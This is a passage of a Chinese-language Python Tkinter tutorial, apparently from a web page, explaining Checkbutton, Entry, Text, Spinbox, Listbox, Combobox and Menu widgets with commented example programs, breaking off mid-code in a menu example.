    b = Checkbutton(root, text=girl, variable=v[-1])
    b.pack(anchor=W)

mainloop()

</textarea><textarea>
import tkinter as tk        # 使用Tkinter前需要先导入

window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽),这里的乘是小x

# 在图形界面上创建一个标签label用以显示并放置
l = tk.Label(window, bg='yellow', width=20, text='empty')
l.pack()

# 定义触发函数功能
def print_selection():
    if (var1.get() == 1) & (var2.get() == 0):     # 如果选中第一个选项,未选中第二个选项
        l.config(text='I love only Python ')
    elif (var1.get() == 0) & (var2.get() == 1):   # 如果选中第二个选项,未选中第一个选项
        l.config(text='I love only C++')
    elif (var1.get() == 0) & (var2.get() == 0):   # 如果两个选项都未选中
        l.config(text='I do not love either')
    else:
        l.config(text='I love both')             # 如果两个选项都选中

var1 = tk.IntVar()  # 定义var1和var2整型变量用来存放选择行为返回值
var2 = tk.IntVar()
c1 = tk.Checkbutton(window, text='Python',variable=var1, onvalue=1, offvalue=0, command=print_selection)
c1.pack()
c2 = tk.Checkbutton(window, text='C++',variable=var2, onvalue=1, offvalue=0, command=print_selection)
c2.pack()

window.mainloop()  # 主窗口循环显示

</textarea><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
from tkinter import messagebox
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        ttk.Label(self.master, text='选择您喜欢的人物:').pack(fill=BOTH, expand=YES)
        self.chars = []
        characters = ('孙悟空', '猪八戒','唐僧', '牛魔王')
        # 采用循环创建多个Checkbutton
        for ch in characters:
            intVar = IntVar()
            self.chars.append(intVar)
            cb = ttk.Checkbutton(self.master,
                text = ch,
                variable = intVar,       # 将Checkbutton绑定到intVar变量
                command = self.change)   # 将选中事件绑定到self.change方法
            cb.pack(anchor=W)
        # 创建一个Label组件
        ttk.Label(self.master, text='选择您喜欢的教程:').pack(fill=BOTH, expand=YES)

        # 第二组Checkbutton
        self.books = []
        books = ('C语言基础教程', 'C++入门教程','Java入门教程', 'Linux教程')
        vals = ('C', 'C++','Java', 'Linux')
        i = 0
        # 采用循环创建多个Checkbutton
        for book in books:
            strVar = StringVar()
            self.books.append(strVar)
            cb = ttk.Checkbutton(self.master,
                text = book,
                variable = strVar,           # 将Checkbutton绑定到strVar变量
                onvalue = vals[i],
                offvalue = '无',
                command = self.books_change) # 将选中事件绑定到books_change方法
            cb.pack(anchor=W)
            i += 1
    def change(self):
        new_li = [str(e.get()) for e in self.chars]  # 将self.chars列表转换成元素为str的列表
        st = ', '.join(new_li)                       # 将new_li列表连接成字符串
        messagebox.showinfo(title=None, message=st)
    def books_change(self):
        new_li = [e.get() for e in self.books]       # 将self.books列表转换成元素为str的列表
        st = ', '.join(new_li)                       # 将new_li列表连接成字符串
        messagebox.showinfo(title=None, message=st)
root = Tk()
root.title("Checkbutton测试")
root.iconbitmap('favicon.ico')  # 改变窗口图标
App(root)
root.mainloop()

</textarea><pre>
【 Entry 】
Entry是tkinter类中提供的的一个单行文本输入域,用来输入显示一行文本,收集键盘输入(类似HTML中的text)。
需要用户输入用户信息时,比如平时使用软件、登录网页时,用户交互界面让登录账户信息等时候可以用到。

</pre><textarea>
from tkinter import *

root = Tk()
e = Entry(root)
e.pack(padx=20, pady=20)
e.delete(0, END)
e.insert(0, "默认字体...")

mainloop()

</textarea>获取输入框里边的内容可以使用Entry组件的get()方法,也可以将一个Tkinter的变量(通常是StringVar)挂钩到textvariable选项, 然后通过变量的get()方法获取<textarea>
from tkinter import *

root = Tk()
Label(root, text="作品:").grid(row=0)
Label(root, text="作者:").grid(row=1)
e1 = Entry(root)
e2 = Entry(root)
e1.grid(row=0, column=1, padx=10, pady=5)
e2.grid(row=1, column=1, padx=10, pady=5)

def show():
    print("作品:<< % s>>" % e1.get())
    print("作者:<< % s>>" % e2.get())
    e1.delete(0, END)
    e2.delete(0, END)

Button(root, text="获取信息", width=10, command=show).grid(row=3, column=0, sticky=W, padx=10, pady=5)
Button(root, text="退出", width=10, command=root.quit()).grid(row=3, column=1, sticky=E, padx=10, pady=5)

mainloop()

</textarea>在输密码时候需要保密, 所以用*代替密码输入即可<textarea>
from tkinter import *

root = Tk()
Label(root, text="User:").grid(row=0)
Label(root, text="Password:").grid(row=1)
e1 = Entry(root)
e2 = Entry(root, show="*")
e1.grid(row=0, column=1, padx=10, pady=5)
e2.grid(row=1, column=1, padx=10, pady=5)

def show():
    print("User:<< % s>>" % e1.get())
    print("Password:<< % s>>" % e2.get())
    e1.delete(0, END)
    e2.delete(0, END)

Button(root, text="芝麻开门", width=10, command=show).grid(row=3, column=0, sticky=W, padx=10, pady=5)
Button(root, text="退出", width=10, command=root.quit()).grid(row=3, column=1, sticky=E, padx=10, pady=5)

mainloop()

</textarea><textarea>
import tkinter as tk  # 使用Tkinter前需要先导入

# 第1步,实例化object,建立窗口window
window = tk.Tk()

# 第2步,给窗口的可视化起名字
window.title('My Window')

# 第3步,设定窗口的大小(长 * 宽)
window.geometry('500x300')  # 这里的乘是小x

# 第4步,在图形界面上设定输入框控件entry并放置控件
e1 = tk.Entry(window, show='*', font=('Arial', 14))   # 显示成密文形式
e2 = tk.Entry(window, show=None, font=('Arial', 14))  # 显示成明文形式
e1.pack()
e2.pack()

# 第5步,主窗口循环显示
window.mainloop()

</textarea><pre>
Entry组件还支持验证输入内容的合法性。例如输入框要求输入的是数字, 用户输入了字母就属于非法输入。实现该功能需要通过设置validate, validatecommand和invalidcommand三个选项。

首先启用验证的"开关"是validate选项, 该选项可以设置的值如下表所示:
'focus':当Entry组件获取或失去焦点时验证
'focusin'：当Entry组件获得焦点时验证
'focusout'：当Entry组件失去焦点时验证
'key'：当输入框被编辑时验证
'all'：当出现以上任意一种情况时验证
'none'：关闭验证功能,默认

其次是为validatecommand选项指定一个验证函数,该函数只能返回True或False表示验证结果。一般情况下验证函数值需要知道输入框的内容即可, 可以通过Entry组建的get()方法获得改字符串。

</pre><textarea>
from tkinter import *

root = Tk()

def test():
    if e1.get() == "小甲鱼":
        print("正确")
        return True
    else:
        print("错误！")
        e1.delete(0, END)
        return False

v = StringVar()
e1 = Entry(root, textvariable=v, validate="focusout", validatecommand=test)
e2 = Entry(root)
e1.pack(padx=10, pady=10)
e2.pack(padx=10, pady=10)

mainloop()

</textarea><pre>
【 Text 】
Text是tkinter类中提供的的一个多行文本区域,显示多行文本,可用来收集或显示用户输入的文字,类似HTML中的textarea,格式化文本显示,允许用不同的样式和属性来显示和编辑文本,同时支持内嵌图象和窗口。
在需要显示编辑用户、产品多行信息时,比如显示用户详细描述文字,产品简介等等,支持随时编辑

</pre><textarea>
import tkinter as tk        # 使用Tkinter前需要先导入
window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽)
e = tk.Entry(window)        # 在图形界面上设定输入框控件entry框并放置
e.pack()

# 定义两个触发事件时的函数insert_point和insert_end,因为Python的执行顺序是从上往下,所以函数一定要放在按钮的上面
def insert_point():         # 在鼠标焦点处插入输入内容
    var = e.get()
    t.insert('insert', var)
def insert_end():           # 在文本框内容最后接着插入输入内容
    var = e.get()
    t.insert('end', var)

# 创建并放置两个按钮分别触发两种情况
b1 = tk.Button(window, text='insert point', width=10, height=2, command=insert_point)
b1.pack()
b2 = tk.Button(window, text='insert end', width=10, height=2, command=insert_end)
b2.pack()

t = tk.Text(window, height=3)  # 创建并放置一个多行文本框text用以显示,指定height=3为文本框是三个字符高度
t.pack()

window.mainloop()  # 主窗口循环显示

</textarea><pre>
Text实际上是一个功能强大的"富文本"编辑组件,这意味着使用Text不仅可以插入文本内容,也可以插入图片,可通过image_create(self, index, cnf={}, **kw)方法来插入。

Text也可以设置被插入文本内容的格式,此时就需要为insert(self, index, chars, *args)方法的最后一个参数传入多个tag进行控制,这样就可以使用Text组件实现图文并茂的效果。

当Text内容较多时就需要对该组件使用滚动条,为了让滚动条控制Text组件内容的滚动,实际上就是将它们进行双向关联,这里需要两步操作：
1、将Scrollbar的command设为目标组件的xview或yview,xview用于水平滚动条控制目标组件水平滚动,yview用于垂直读动条控制目标组件垂直滚动。
2、将目标组件的xscrollcommand或yscrollcommand属性设为Scrollbar的set方法。

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建Text组件
        text1 = Text(self.master, height=27, width=32)
        book = PhotoImage(file='light.gif')  # 创建图片
        text1.bm = book
        text1.insert(END,'\n')
        text1.image_create(END, image=book)  # 在结尾处插入图片
        text1.pack(side=LEFT, fill=BOTH, expand=YES)

        # 创建第二个Text组件
        text2 = Text(self.master, height=33, width=50)
        text2.pack(side=LEFT,  fill=BOTH, expand=YES)
        self.text = text2
        # 创建Scrollbar组件,设置该组件与text2的纵向滚动关联
        scroll = Scrollbar(self.master, command=text2.yview)
        scroll.pack(side=RIGHT, fill=Y)
        # 设置text2的纵向滚动影响scroll滚动条
        text2.configure(yscrollcommand=scroll.set)
        # 配置名为title的样式,spacing2设置行间距,spacing3设置段间距
        text2.tag_configure('title', font=('楷体', 20, 'bold'), foreground='red', justify=CENTER, spacing3=20)
        text2.tag_configure('detail', foreground='darkgray', font=('微软雅黑', 11, 'bold'), spacing2=10, spacing3=15)
        text2.insert(END,'\n')
        text2.insert(END,'C语言中文网\n', 'title') # 插入文本内容,设置使用title样式
        star = PhotoImage(file='light.gif') # 创建图片
        text2.bm = star
        details = ('C语言中文网成立于 2012 年初,目前已经运营了将近 5 年,我们致力于分享精品教程,帮助对编程感兴趣的读者。\n' ,
        '我们一直都在坚持的是：认认真真、一丝不苟、以工匠的精神来打磨每一套教程,让读者感受到作者的用心,以及默默投入的时间,由衷地心动和点赞。\n',
        '这样的教程是一件作品,而不是呆板的文字！\n',
        '这样的教程是一件作品,而不是呆板的文字！\n',
        '这样的教程是一件作品,而不是呆板的文字！\n',
        '这样的教程是一件作品,而不是呆板的文字！\n')
        # 采用循环插入多条介绍信息
        for de in details:
            text2.image_create(END, image=star)
            text2.insert(END, de, 'detail')
        url =['http://vip.biancheng.net/','http://c.biancheng.net/']
        name =['VIP会员', 'C语言中文网']
        m=0
        for each in name:
            # 为每个链接创建单独的配置
            text2.tag_configure(m, foreground='blue', underline=True, font=('微软雅黑', 13, 'bold'))
            text2.tag_bind(m, '<Enter>', self.show_arrow_cursor)
            text2.tag_bind(m, '<Leave>', self.show_common_cursor)
            # 使用handlerAdaptor包装,将当前链接参数传入事件处理函数
            text2.tag_bind(m, '<Button-1>', self.handlerAdaptor(self.click, x = url[m]))
            text2.insert(END, each + '\n', m)
            m += 1
    def show_arrow_cursor(self, event):
        self.text.config(cursor='arrow')  # 光标移上去时变成箭头
    def show_common_cursor(self, event):
        self.text.config(cursor='xterm')  # 光标移出去时恢复原样
    def click(self, event, x):
        import webbrowser
        webbrowser.open(x)                # 使用默认浏览器打开链接
    def handlerAdaptor(self, fun,**kwds):
        return lambda event, fun=fun, kwds=kwds: fun(event,**kwds)
root = Tk()
root.title("Text测试")
App(root)
root.mainloop()

</textarea><pre>
【 Entry和Text控件用法 】
Entry和Text组件都是可接收用户输入的输入框组件,区别是Entry是单行输入框组件,Text是多行输入框组件,而且Text可以为不同的部分添加不同的格式,甚至响应事件。

不管是Entry还是Text组件,程序都提供了get()方法来获取文本框中的内容;但如果程序要改变文本框中的内容,则需要调用二者的insert()方法来实现。
如果要删除Entry或Text组件中的部分内容,则可通过delete(self,first,last=None)方法实现,该方法指定删除从first到last之间的内容。

Entry和Text支持的索引
Entry是单行文本框组件,因此它的索引很简单,比如要指定第4个字符到第8个字符,索引指定为(3,8)即可
Text是多行文本框组件,因此它的索引需要同时指定行号和列号,比如1.0代表第1行第1列(行号从1开始,列号从0开始),如果要指定第2行第3个字符到第3行第7个字符,索引应指定为(2.2,3.6)。

Entry支持双向绑定,程序可以将Entry与变量绑定在一起,这样程序就可以通过该变量来改变、获取Entry组件中的内容。

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
from tkinter import messagebox
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建Entry组件
        self.entry = ttk.Entry(self.master, width=44, font=('StSong', 14), foreground='green')
        self.entry.pack(fill=BOTH, expand=YES)
        # 创建Entry组件
        self.text = Text(self.master, width=44, height=4, font=('StSong', 14), foreground='gray')
        self.text.pack(fill=BOTH, expand=YES)
        # 创建Frame作为容器
        f = Frame(self.master)
        f.pack()
        # 创建五个按钮,将其放入Frame中
        ttk.Button(f, text='开始插入', command=self.insert_start).pack(side=LEFT)
        ttk.Button(f, text='编辑处插入', command=self.insert_edit).pack(side=LEFT)
        ttk.Button(f, text='结尾插入', command=self.insert_end).pack(side=LEFT)
        ttk.Button(f, text='获取Entry', command=self.get_entry).pack(side=LEFT)
        ttk.Button(f, text='获取Text', command=self.get_text).pack(side=LEFT)
    def insert_start(self):
        # 在Entry和Text开始处插入内容
        self.entry.insert(0, 'Kotlin')
        self.text.insert(1.0, 'Kotlin')
    def insert_edit(self):
        # 在Entry和Text的编辑处插入内容
        self.entry.insert(INSERT, 'Python')
        self.text.insert(INSERT, 'Python')
    def insert_end(self):
        # 在Entry和Text的结尾处插入内容
        self.entry.insert(END, 'Swift')
        self.text.insert(END, 'Swift')
    def get_entry(self):
        messagebox.showinfo(title='输入内容', message=self.entry.get())
    def get_text(self):
        messagebox.showinfo(title='输入内容', message=self.text.get(1.0, END))
root = Tk()
root.title("Entry测试")
App(root)
root.mainloop()

</textarea><pre>
【 Spinbox 】
输入控件;与Entry类似,但可指定输入范围值
Spinbox控件是一个带有两个小箭头的文本框,用户既可以通过两个小箭头上下调整该组件内的值,也可以直接在文本框内输入内容作为该组件的值。
Spinbox本质上也相当于一个列表框,类似于Combobox,但Spinbox不会展开下拉列表供用户选择。Spinbox只能通过向上、向下箭头来选择不同的选项。
在使用Spinbox组件时,既可通过from(由于from是关键字,实际使用时写成from_)、to、increment 选项来指定选项列表,也可通过values选项来指定多个列表项,该选项的值可以是list或tuple。
Spinbox同样可通过textvariable选项将它与指定变量绑定,这样程序即可通过该变量来获取或修改Spinbox组件的值。
Spinbox还可通过command选项指定事件处理函数或方法,即当用户单击Spinbox的向上、向下箭头时程序就会触发command选项指定的事件处理函数或方法。

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        ttk.Label(self.master, text='指定from、to、increment').pack()
        # 通过指定from_、to、increament选项创建Spinbox
        sb1 = Spinbox(self.master, from_ = 20, to = 100, increment = 5)
        sb1.pack(fill=X, expand=YES)

        ttk.Label(self.master, text='指定values').pack()
        # 通过指定values选项创建Spinbox
        self.sb2 = Spinbox(self.master, values=('Python', 'Swift', 'Kotlin', 'Ruby'), command = self.press) # 通过command绑定事件处理方法
        self.sb2.pack(fill=X, expand=YES)

        ttk.Label(self.master, text='绑定变量').pack()
        self.intVar = IntVar()
        # 通过指定values选项创建Spinbox,并通过textvariable为之绑定变量
        sb3 = Spinbox(self.master, values=list(range(20, 100, 4)), textvariable = self.intVar, command = self.press)
        sb3.pack(fill=X, expand=YES)
        self.intVar.set(33) # 通过变量改变Spinbox的值
    def press(self):
        print(self.sb2.get())
root = Tk()
root.title("Spinbox测试")
App(root)
root.mainloop()

</textarea><pre>
【 Message 】
消息控件;用来显示多行文本,与label类似

【 Listbox和Combobox 】
Listbox是tkinter类中提供的的列表框部件,显示供选方案的一个列表,此组件适用于提供的选项非常多的情况。listbox能够被配置来得到radiobutton或checklist的行为。

Listbox代表一个列表框,用户可通过列表框来选择一个列表项。ttk模块下的Combobox则是Listbox的改进版,它既提供了单行文本框让用户直接输入(就像Entry一样),也提供了下拉列表框供用户选择(就像Listbox一样),因此它被称为复合框。

程序创建Listbox起码需要两步：
1、创建Listbox对象,并为之执行各种选项。Listbox除支持大部分通用选项之外,还支持selectmode选项用于设置Listbox的选择模式。
2、调用Listbox的insert(self, index, *elements)方法来添加选项。从最后一个参数可以看出,该方法既可每次添加一个选项,也可传入多个参数,每次添加多个选项。index参数指定选项的插入位置,它支持END(结尾处)、ANCHOR(当前位置)和ACTIVE(选中处)等特殊索引。

Listbox的selectmode支持的选择模式有如下几种：
'browse'：单选模式,支持按住鼠标键拖动来改变选择。
'multiple'：多选模式。
'single'：单选模式,必须通过鼠标键单击来改变选择。
'extended'：扩展的多选模式,必须通过CtrL或Shift键辅助实现多选。

如果程序要获取Listbox当前选中的项则可通过curselection()方法来实现,该方法会返回一个元组,该元组包含当前Listbox的所有选中项

</pre><textarea>
from tkinter import *

root = Tk()
theLB = Listbox(root, setgrid=True)              # 创建一个空列表
theLB.pack()
for item in ["篮球", "足球", "乒乓球", "羽毛球"]:  # 往列表里添加数据
    theLB.insert(END, item)
theButton = Button(root, text="删除", command=lambda x=theLB: x.delete(ACTIVE))
theButton.pack()

mainloop()

</textarea><textarea>
from tkinter import *                     # 导入tkinter库
root = Tk()                               # 创建一个主窗口对象,用于容纳整个GUI程序
root.title("NEW")                         # 设置主窗口对象的标题栏
li     = ['python','php','html','SQL']    # 创建两个列表
movie  = ['CSS','jQuery','Bootstrap']
listb  = Listbox(root)                    # 创建两个列表组件
listb2 = Listbox(root)
for item in li: listb.insert(0,item)      # 第一个小部件插入数据
for item in movie: listb2.insert(0,item)  # 第二个小部件插入数据
listb.pack()                              # 将小部件放置到主窗口中
listb2.pack()                             # 用于自动调节组件自身的尺寸,这时候窗口还是不会显示的,除非执行下面的这条代码
root.mainloop()                           # 进入消息循环

</textarea><textarea>
import tkinter as tk       # 使用Tkinter前需要先导入

window = tk.Tk()           # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽),这里的乘是小x

# 在图形界面上创建一个标签label用以显示并放置
var1 = tk.StringVar()  # 创建变量,用var1用来接收鼠标点击具体选项的内容
l = tk.Label(window, bg='green', fg='yellow',font=('Arial', 12), width=10, textvariable=var1)
l.pack()

# 创建一个方法用于按钮的点击事件
def print_selection():
    value = lb.get(lb.curselection())   # 获取当前选中的文本
    var1.set(value)                     # 为label设置值

# 创建一个按钮,点击按钮调用print_selection函数
b1 = tk.Button(window, text='print selection', width=15, height=2, command=print_selection)
b1.pack()

# 创建Listbox并为其添加内容
var2 = tk.StringVar()
var2.set((1,2,3,4))                         # 为变量var2设置值
lb = tk.Listbox(window, listvariable=var2)  # 创建Listbox,将var2的值赋给Listbox
list_items = [11,22,33,44]  # 创建一个list并将值循环添加到Listbox控件中
for item in list_items:
    lb.insert('end', item)  # 从最后一个位置开始加入值
lb.insert(1, 'first')       # 在第一个位置加入'first'字符
lb.insert(2, 'second')      # 在第二个位置加入'second'字符
lb.delete(2)                # 删除第二个位置的字符
lb.pack()

window.mainloop()           # 主窗口循环显示

</textarea><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        topF = Frame(self.master)
        topF.pack(fill=Y, expand=YES)
        # 创建Listbox组件
        self.lb = Listbox(topF)
        self.lb.pack(side=LEFT, fill=Y, expand=YES)
        for item in ['Python', 'Kotlin', 'Swift', 'Ruby']:
            self.lb.insert(END, item)

        self.lb.insert(ANCHOR, 'Python-1', 'Kotlin-1', 'Swift-1', 'Ruby-1')  # 或直接使用多个元素来插入
        scroll = Scrollbar(topF, command=self.lb.yview)  # 创建Scrollbar组件,设置该组件与self.lb的纵向滚动关联
        scroll.pack(side=RIGHT, fill=Y)
        self.lb.configure(yscrollcommand=scroll.set)     # 设置self.lb的纵向滚动影响scroll滚动条

        f = Frame(self.master)
        f.pack()
        Label(f, text = '选择模式:').pack(side=LEFT)
        modes = ('multiple', 'browse', 'single', 'extended')
        self.strVar = StringVar()
        for m in modes:
            rb = ttk.Radiobutton(f, text = m, value = m, variable = self.strVar, command = self.choose_mode)
            rb.pack(side=LEFT)
        self.strVar.set('browse')
    def choose_mode(self):
        print(self.strVar.get())
        self.lb['selectmode'] = self.strVar.get()
root = Tk()
root.title("Listbox测试")
root.iconbitmap('images/fklogo.ico')  # 改变窗口图标
App(root)
root.mainloop()

</textarea><pre>
除了最常见的insert()方法,Listbox还支持如下常见的操作列表项的方法：
selection_set(self, first, last=None)：选中从first到last(包含)的所有列表项。如果不指定last则直接选中first列表项。
selection_clear(self, first, last=None)：取消选中从first到last(包含)的所有列表项。如果不指定last则只取消选中first列表项。
delete(self, first, last=None)：删除从first到last(包含)的所有列表项。如果不指定last则只删除first列表项。

Listbox也支持使用listvariable选项与变量进行绑定,但这个变量并不是控制Listbox选中哪些项,而是控制Listbox包含哪些项,即如果listvariable选项与变量进行了双向绑定则无须调用insert()、delete()方法来添加、删除列表项,只要通过绑定变量即可改变Listbox中的列表项。

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        topF = Frame(self.master)
        topF.pack(fill=Y, expand=YES)
        self.v = StringVar()
        self.lb = Listbox(topF, listvariable = self.v)  # 创建Listbox组件,与v变量绑定
        self.lb.pack(side=LEFT, fill=Y, expand=YES)
        for item in range(20):
            self.lb.insert(END, str(item))

        scroll = Scrollbar(topF, command=self.lb.yview) # 创建Scrollbar组件,设置该组件与self.lb的纵向滚动关联
        scroll.pack(side=RIGHT, fill=Y)
        self.lb.configure(yscrollcommand=scroll.set)    # 设置self.lb的纵向滚动影响scroll滚动条

        f = Frame(self.master)
        f.pack()
        Button(f, text="选中10项", command=self.select).pack(side=LEFT)
        Button(f, text="清除选中3项", command=self.clear_select).pack(side=LEFT)
        Button(f, text="删除3项", command=self.delete).pack(side=LEFT)
        Button(f, text="绑定变量", command=self.var_select).pack(side=LEFT)
    def select(self):
        self.lb.selection_set(0, 9)  # 选中指定项
    def clear_select(self):
        self.lb.selection_clear(1,3) # 取消选中指定项
    def delete(self):
        self.lb.delete(5, 8)         # 删除指定项
    def var_select(self):
        self.v.set(('12', '15'))     # 修改与Listbox绑定的变量
root = Tk()
root.title("Listbox测试")
root.iconbitmap('images/fklogo.ico') # 改变窗口图标
App(root)
root.mainloop()

</textarea>Listbox不支持使用command选项来绑定事件处理函数或方法,如果程序需要绑定事件处理函数或方法则可通过bind()来实现<textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        topF = Frame(self.master)
        topF.pack(fill=Y, expand=YES)
        self.lb = Listbox(topF)
        self.lb.pack(side=LEFT, fill=Y, expand=YES)
        for item in range(20):
            self.lb.insert(END, str(item))
        scroll = Scrollbar(topF, command=self.lb.yview)  # 创建Scrollbar组件,设置该组件与self.lb的纵向滚动关联
        scroll.pack(side=RIGHT, fill=Y)
        self.lb.configure(yscrollcommand=scroll.set)     # 设置self.lb的纵向滚动影响scroll滚动条
        self.lb.bind("<Double-1>", self.click)           # 为双击事件绑定事件处理方法
    def click(self, event):
        from tkinter import messagebox
        messagebox.showinfo(title=None, message=str(self.lb.curselection())) # 获取Listbox当前选中项
root = Tk()
root.title("Listbox测试")
root.iconbitmap('images/fklogo.ico') # 改变窗口图标
App(root)
root.mainloop()

</textarea><pre>
Combobox的用法更加简单,程序可通过values选项直接为它设置多个选项。该组件的state选项支持'readonly'状态代表Combobox的文本框不允许编辑,只能通过下拉列表框的列表项来改变。
Combobox同样可通过textvariable选项将它与指定变量绑定,这样程序可通过该变量来获取或修改Combobox组件的值。
Combobox还可通过postcommand选项指定事件处理函数或方法,当用户单击Combobox的下拉箭头时程序就会触发postcomrnand选项指定的事件处理函数或方法。

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.strVar = StringVar()
        # 创建Combobox组件
        self.cb = ttk.Combobox(self.master,
            textvariable=self.strVar, # 绑定到self.strVar变量
            postcommand=self.choose)  # 当用户单击下拉箭头时触发self.choose方法
        self.cb.pack(side=TOP)
        self.cb['values'] = ['Python', 'Ruby', 'Kotlin', 'Swift']  # 为Combobox配置多个选项

        f = Frame(self.master)
        f.pack()
        self.isreadonly = IntVar()
        # 创建Checkbutton,绑定到self.isreadonly变量
        Checkbutton(f, text = '是否只读:', variable=self.isreadonly, command=self.change).pack(side=LEFT)
        # 创建Button,单击该按钮激发setvalue方法
        Button(f, text = '绑定变量设置', command=self.setvalue).pack(side=LEFT)
    def choose(self):
        from tkinter import messagebox
        messagebox.showinfo(title=None, message=str(self.cb.get()))  # 获取Combbox的当前值
    def change(self):
        self.cb['state'] = 'readonly' if self.isreadonly.get() else 'enable'
    def setvalue(self):
        self.strVar.set('我爱Python')
root = Tk()
root.title("Combobox测试")
root.iconbitmap('images/fklogo.ico')  # 改变窗口图标
App(root)
root.mainloop()

</textarea><pre>
【 Menu 】
菜单控件;显示菜单栏,下拉菜单和弹出菜单
菜单条,用来实现下拉和弹出式菜单,点下菜单后弹出的一个选项列表,用户可以从中选择

Tkinter为菜单提供了Menu类,该类既可代表菜单条,也可代表菜单,还可代表上下文菜单(右键菜单)。简单来说Menu类就可以搞定所有菜单相关内容。

程序可调用Menu的构造方法来创建菜单,在创建菜单之后可通过如下方法添加菜单项：
add_command()：添加菜单项。
add_checkbutton()：添加复选框菜单项。
add_radiobutton()：添加单选钮菜单项。
add_separator()：添加菜单分隔条。

上面的前三个方法都用于添加菜单项,因此都支持如下常用选项：
label：指定菜单项的文本。
command：指定为菜单项绑定的事件处理方法。
image：指定菜单项的图标。
compound：指定在菜单项中图标位于文字的哪个方位。

有了菜单之后,接下来就是如何使用菜单了,菜单有两种用法：
在窗口上方通过菜单条管理菜单。
通过鼠标右键触发右键菜单(上下文菜单)。

Menu窗口菜单
在创建菜单之后,如果要将菜单设置为窗口的菜单条(Menu对象可被当成菜单条使用),则只要将应菜单设为窗口的 menu 选项即可

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
from tkinter import messagebox as msgbox
class App:
    def __init__(self, master):
        self.master = master
        self.init_menu()
    # 创建菜单
    def init_menu(self):
        # self.master.filenew_icon = PhotoImage(file='./cursor_big.jpg')
        # self.master.fileopen_icon = PhotoImage(file='./cursor_small.jpg')

        menubar = Menu(self.master)  # 创建menubar,它被放入self.master中
        self.master['menu'] = menubar # 添加菜单条

        file_menu = Menu(menubar, tearoff=0)  # 创建file_menu菜单,它被放入menubar中
        menubar.add_cascade(label='文件', menu=file_menu)     # 使用add_cascade方法添加file_menu菜单

        lang_menu = Menu(menubar, tearoff=0)  # 创建lang_menu菜单,它被放入menubar中
        menubar.add_cascade(label='选择语言', menu=lang_menu)  # 使用add_cascade方法添加lang_menu菜单

        # 使用add_command方法为file_menu添加菜单项
        file_menu.add_command(label="新建", command=None, image=None, compound=LEFT)
        file_menu.add_command(label="打开", command=None, image=None, compound=LEFT)
        # 使用add_command方法为file_menu添加分隔条
        file_menu.add_separator()

        sub_menu = Menu(file_menu, tearoff=0)  # 为file_menu创建子菜单
        file_menu.add_cascade(label='性别', menu=sub_menu)  # 使用add_cascade方法添加sub_menu子菜单
        self.genderVar = IntVar()
        # 使用循环为sub_menu子菜单添加菜单项
        for i, im in enumerate(['男', '女', '保密']):
            # 使用add_radiobutton方法为sub_menu子菜单添加单选菜单项,绑定同一个变量,说明它们是一组
            sub_menu.add_radiobutton(label=im, command=self.choose_gender, variable=self.genderVar, value=i)

        self.langVars = [StringVar(), StringVar(), StringVar(), StringVar()]
        # 使用循环为lang_menu菜单添加菜单项
        for i, im in enumerate(('Python', 'Kotlin','Swift', 'Java')):
            # 使用add_add_checkbutton方法为lang_menu菜单添加多选菜单项
            lang_menu.add_checkbutton(label=im, command=self.choose_lang, onvalue=im, variable=self.langVars[i])

    def choose_gender(self):
        msgbox.showinfo(message=('选择的性别为: %s' % self.genderVar.get()))
    def choose_lang(self):
        rt_list = [e.get() for e in self.langVars]
        msgbox.showinfo(message=('选择的语言为: %s' % ','.join(rt_list)))

root = Tk()
root.title("菜单测试")
root.geometry('400x200')
root.resizable(width=False, height=False)  # 禁止改变窗口大小
App(root)
root.mainloop()

</textarea><textarea>
from tkinter import *
from tkinter import ttk
from collections import OrderedDict
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()

    def initWidgets(self):
        self.init_icons()    # 初始化菜单、工具条用到的图标
        self.init_menu()     # 调用init_menu初始化菜单
        self.init_toolbar()  # 调用init_toolbar初始化工具条,Tkinter未提供工具条组件,以Frame来实现工具条,以Button实现工具条上的按钮

        # 创建、添加左边的Frame容器
        leftframe = ttk.Frame(self.master, width=40)
        leftframe.pack(side=LEFT, fill=Y)

        # 在左边窗口放一个Listbox
        lb = Listbox(leftframe, font=('Courier New', 20))
        lb.pack(fill=Y, expand=YES)
        for s in ('Python', 'Ruby', 'Swift', 'Kotlin', 'Java'):
            lb.insert(END, s)

        # 创建、添加右边的Frame容器
        mainframe = ttk.Frame(self.master)
        mainframe.pack(side=LEFT, fill=BOTH)

        text = Text(mainframe, width=40, font=('Courier New', 16))
        text.pack(side=LEFT, fill=BOTH)
        scroll = ttk.Scrollbar(mainframe)
        scroll.pack(side=LEFT,fill=Y)
        scroll['command'] = text.yview  # 设置滚动条与text组件关联
        text.configure(yscrollcommand=scroll.set)

    # 创建菜单
    def init_menu(self):
        '初始化菜单的方法'

        menus = ('文件', '编辑', '帮助')  # 定义菜单条所包含的3个菜单
        items = (                        # 定义菜单数据
